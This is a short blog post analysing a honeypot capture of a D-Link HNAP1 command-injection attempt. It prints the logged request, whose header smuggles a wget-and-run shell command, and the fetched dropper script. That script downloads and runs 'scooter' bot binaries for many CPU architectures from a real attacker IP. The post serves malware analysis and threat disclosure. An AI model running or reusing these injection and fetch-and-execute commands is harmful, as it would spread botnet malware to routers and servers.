---
layout: post
title:  "Scooter bot"
date:   2022-10-02 18:25:33 +0100
category: malware
tags: malware reverse-engineering honey-pot ghidra
--- 
Running the honey pot again I have picked up some more malware attacks...

```
15:49:58.513 Handling POST to /HNAP1/ request from 79.110.62.188
>>>Headers: HoneyPotIp:8080 Mozila/5.0 gzip, deflate */* keep-alive "http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://45.95.55.214/a/wget.sh;chmod 777 wget.sh;sh wget.sh Dlink;rm -rf wget.sh`" 0 
>>>Body: 
15:49:58.514 completed response status 200
```
The request attempts to execute the following command `cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://45.95.55.214/a/wget.sh;chmod 777 wget.sh;sh wget.sh Dlink;rm -rf wget.sh` This will download `wget.sh` and run it.

Running `wget http://45.95.55.214/a/wget.sh` we get the following response:
```
cd /tmp && wget http://45.95.55.214/scooter/bot.arm4 && curl -O http://45.95.55.214/scooter/bot.arm4 && chmod 777 bot.arm4 && ./bot.arm4 $1
cd /tmp && wget http://45.95.55.214/scooter/bot.arm7 && curl -O http://45.95.55.214/scooter/bot.arm7 && chmod 777 bot.arm7 && ./bot.arm7 $1
cd /tmp && wget http://45.95.55.214/scooter/bot.i686 && curl -O http://45.95.55.214/scooter/bot.i686 && chmod 777 bot.i686 && ./bot.i686 $1
cd /tmp && wget http://45.95.55.214/scooter/bot.mips64 && curl -O http://45.95.55.214/scooter/bot.mips64 && chmod 777 bot.mips64 && ./bot.mips64 $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.ppc440 && curl -O http://45.95.55.214/scooter/bot.ppc440 && chmod 777 bot.ppc440 && ./bot.ppc440 $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.x86_64 && curl -O http://45.95.55.214/scooter/bot.x86_64 && chmod 777 bot.x86_64 && ./bot.x86_64 $1
cd /tmp && wget http://45.95.55.214/scooter/bot.arm5 && curl -O http://45.95.55.214/scooter/bot.arm5 && chmod 777 bot.arm5 && ./bot.arm5 $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.armv4eb && curl -O http://45.95.55.214/scooter/bot.armv4eb && chmod 777 bot.armv4eb && ./bot.armv4eb $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.m68k && curl -O http://45.95.55.214/scooter/bot.m68k && chmod 777 bot.m68k && ./bot.m68k $1
cd /tmp && wget http://45.95.55.214/scooter/bot.mipsel && curl -O http://45.95.55.214/scooter/bot.mipsel && chmod 777 bot.mipsel && ./bot.mipsel $1
cd /tmp && wget http://45.95.55.214/scooter/bot.sh4 && curl -O http://45.95.55.214/scooter/bot.sh4 && chmod 777 bot.sh4 && ./bot.sh4 $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.arm6 && curl -O http://45.95.55.214/scooter/bot.arm6 && chmod 777 bot.arm6 && ./bot.arm6 $1
cd /tmp && wget http://45.95.55.214/scooter/bot.armv4tl && curl -O http://45.95.55.214/scooter/bot.armv4tl && chmod 777 bot.armv4tl && ./bot.armv4tl $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.mips && curl -O http://45.95.55.214/scooter/bot.mips && chmod 777 bot.mips && ./bot.mips $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.powerpc && curl -O http://45.95.55.214/scooter/bot.powerpc && chmod 777 bot.powerpc && ./bot.powerpc $1 
cd /tmp && wget http://45.95.55.214/scooter/bot.sparc && curl -O http://45.95.55.214/scooter/bot.sparc && chmod 777 bot.sparc && ./bot.sparc
```
This scrpit dowloads several builds of the malware and attempts to execute it, each build appears to be compiled for different CPU architectures.

